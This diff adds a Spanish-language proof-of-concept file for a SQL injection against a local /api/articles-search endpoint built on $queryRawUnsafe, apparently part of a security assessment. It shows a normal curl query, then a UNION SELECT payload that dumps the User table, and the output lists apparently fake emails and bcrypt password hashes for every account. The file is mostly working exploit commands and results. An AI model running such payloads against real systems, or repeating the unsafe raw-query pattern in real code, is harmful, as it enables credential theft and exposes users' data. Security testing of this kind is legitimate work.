@@ -1,0 +1,98 @@
+################################################################
+# PoC A03:2021 - INYECCION SQL   |   Estado: VULNERABLE
+# Endpoint: GET /api/articles-search?q=   (usa $queryRawUnsafe)
+################################################################
+
+## Paso 1. Consulta legitima
+$ curl -G 'http://localhost:3000/api/articles-search' --data-urlencode 'q=feed'
+{
+    "query": "SELECT id, title, description FROM Article WHERE title LIKE '%feed%'",
+    "results": [
+        {
+            "id": 1,
+            "title": "Use the 1080p IB feed, then you can reboot the haptic feed!",
+            "description": "Molestias fugit perspiciatis voluptatem nihil assumenda doloribus. Reiciendis et aperiam ea fugiat ipsum atque omnis qui. Doloribus officiis quisquam optio nihil. Minus iure consequatur fugit quidem quae. Sit et ducimus culpa voluptatum officiis fugiat."
+        }
+    ]
+}
+
+## Paso 2. Payload de inyeccion (UNION para exfiltrar credenciales)
+   q = %' UNION SELECT id, email, password FROM User-- 
+$ curl -G 'http://localhost:3000/api/articles-search' --data-urlencode "q=%' UNION SELECT id, email, password FROM User-- "
+{
+    "query": "SELECT id, title, description FROM Article WHERE title LIKE '%%' UNION SELECT id, email, password FROM User-- %'",
+    "results": [
+        {
+            "id": 1,
+            "title": "Use the 1080p IB feed, then you can reboot the haptic feed!",
+            "description": "Molestias fugit perspiciatis voluptatem nihil assumenda doloribus. Reiciendis et aperiam ea fugiat ipsum atque omnis qui. Doloribus officiis quisquam optio nihil. Minus iure consequatur fugit quidem quae. Sit et ducimus culpa voluptatum officiis fugiat."
+        },
+        {
+            "id": 1,
+            "title": "francisco-javier+wafula336@qq.dev",
+            "description": "$2a$10$CmTQfL0o3N4RzhbtI1gH.ecueS19YxYa.dqD3IdF6VLidOl7tDNkm"
+        },
+        {
+            "id": 2,
+            "title": "willemyoshida@libero.name",
+            "description": "$2a$10$7PiCtm2Rxcrm7vxNR/3yhu/a6ecpfCHt.Zj9p4las/q.4kaPDrTEe"
+        },
+        {
+            "id": 3,
+            "title": "xiaohong.nyambura938@msn.io",
+            "description": "$2a$10$BxKT.4pTOS.xadINp4yv7uDUVnDd0Kzhk2AYBdQxgTOymZ6SnUmxS"
+        },
+        {
+            "id": 4,
+            "title": "kseniya+cohen885@ntlworld.com",
+            "description": "$2a$10$gfgvVEWTwXKc/x6yzrca6.38PL.4iNaebxgQ/GtGnYFyuCC0AYZim"
+        },
+        {
+            "id": 5,
+            "title": "elisabeth_barasa325@gmx.info",
+            "description": "$2a$10$wnYYMe/MRY4YwG0IKNA3tex60I9SYAbW7DqVXctAHV4J6HdYEVh9C"
+        },
+        {
+            "id": 6,
+            "title": "birna-davis874@bol.name",
+            "description": "$2a$10$FZ7S1EE.yFK3fsE/.X.kcOx3jnUU1bdX8a8w.nuRQi2dmx0ZMnW2e"
+        },
+        {
+            "id": 7,
+            "title": "juanwilliams357@uol.name",
+            "description": "$2a$10$3X0ZgFRorGv8D5gkIuGKyOvu/xoBlf7YVAi35XytHMwtljdPd3hny"
+        },
+        {
+            "id": 8,
+            "title": "marta+szewczyk@rediffmail.biz",
+            "description": "$2a$10$h0Z6Y.7Blce8Dv0nMBlh.eT3pV5Sha1UXO55p1lgT0SJiJFFdsLPO"
+        },
+        {
+            "id": 9,
+            "title": "sabinemaciejewski@windstream.io",
+            "description": "$2a$10$IUHqJ5zziDZzsGh45xZxpef42FlpiN/QojKvEj7siSbS/nscINno6"
+        },
+        {
+            "id": 10,
+            "title": "anan.huber@yandex.info",
+            "description": "$2a$10$haCtBV9fvfC1TgIUCSWuzeaaBy6xdIKTMjn4htFEK31f42moplLvu"
+        },
+        {
+            "id": 11,
+            "title": "daniel_pritchard485@live.com",
+            "description": "$2a$10$H67T8RBWwZKWJcAjVQGvz.Xn7eHJQuMOsac5FBc8KLV6ZoxptvWti"
+        },
+        {
+            "id": 12,
+            "title": "joannaayutthaya962@terra.org",
+            "description": "$2a$10$s/llBfmCKgP9TMCsYlMrXuwim/7KnRlaKMlFW3xwC1l7cH5FOiw1S"
+        },
+        {
+            "id": 13,
+            "title": "victima@test.com",
+            "description": "$2a$10$.7ES9tgpOEtcqMUVq78uvOae48Jx7XbRfL/qTmqDYy1BqoQYyhztu"
+        }
+    ]
+}
+
+## Resultado: se exponen correos y hashes bcrypt de TODOS los usuarios.
